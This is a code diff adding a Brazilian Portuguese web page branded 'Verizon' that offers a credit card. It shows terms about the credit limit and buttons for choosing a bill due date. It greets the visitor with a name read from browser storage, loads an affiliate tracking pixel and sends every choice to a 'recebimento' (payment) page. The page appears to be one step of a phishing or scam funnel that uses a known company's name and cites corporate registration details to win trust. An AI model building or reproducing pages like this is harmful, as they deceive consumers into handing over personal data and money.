@@ -1,0 +1,95 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verizon - Faça seu Cartão</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/style.css">
+    
+<script src="js/latest.js" async="" defer=""></script>
+
+<script>
+  window.pixelId = "66bb763debbcebab27d68442";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+    
+</head><body>
+    <link rel="stylesheet" href="css/style.css">
+
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">   
+    <div class="header">
+        <img style="width: 160px;" src="images/VfoPzxB.png" alt="Imagem Centralizada"> 
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;">
+        <div style="margin-top: 40px; padding: 2rem 1.5rem 1rem 1.5rem;" class="main-content">
+            <div id="analise-secao" class="mb-3 " style="display: block;">
+                <p class="text-start">Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente. </p>
+                <p class="text-start">No entanto, se houver atraso no pagamento das faturas, o limite poderá ser reduzido. </p>
+                <button class="btn btn-custom rounded-pill" onclick="mostrarPagina('vencimento-secao')">Concordo</button>
+            </div>
+    
+            <!-- Seção da escolha do vencimento da fatura -->
+            <div id="vencimento-secao" class="mb-3" style="display: none;">
+                <p style="font-size: 18px;">Ótimo <strong id="nomeCliente"></strong>! Agora escolha o vencimento da sua fatura!</p>
+                <button class="btn btn-custom w-100">05</button>
+                <button class="btn btn-custom w-100">10</button>
+                <button class="btn btn-custom w-100">15</button>
+                <button class="btn btn-custom w-100">25</button>
+                <button class="btn btn-custom w-100">30</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
+            if (dadosUsuario && dadosUsuario.nome) {
+                const nomeCompleto = dadosUsuario.nome.split(' ');
+                const primeiroNome = nomeCompleto[0];
+                const nomeParaMostrar = `${primeiroNome}`;
+                document.getElementById('nomeCliente').textContent = nomeParaMostrar;
+            } else {
+                console.error('Nome do usuário não encontrado no localStorage.');
+            }
+        });
+
+        function mostrarPagina(paginaId) {
+            document.getElementById('analise-secao').style.display = 'none';
+            document.getElementById('vencimento-secao').style.display = 'none';
+
+            document.getElementById(paginaId).style.display = 'block';
+        }
+        // Mostra a seção de escolha do vencimento inicialmente
+        mostrarPagina('analise-secao');
+
+        // Event listener para capturar a escolha e mostrar a próxima seção
+        document.querySelectorAll('#vencimento-secao .btn').forEach(button => {
+            button.addEventListener('click', function() {
+                window.location.href = '../recebimento/index.php';
+            });
+        });
+    </script>
+
+    <div class="footer py-4" id="footerChg">
+        © 2024 Verizon S/A. CNPJ 68.694.585/0001-20. <br>
+        Av. Brig. Faria Lima, 1811, São Paulo/SP
+    </div>
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+
+
+
+</div></body></html>
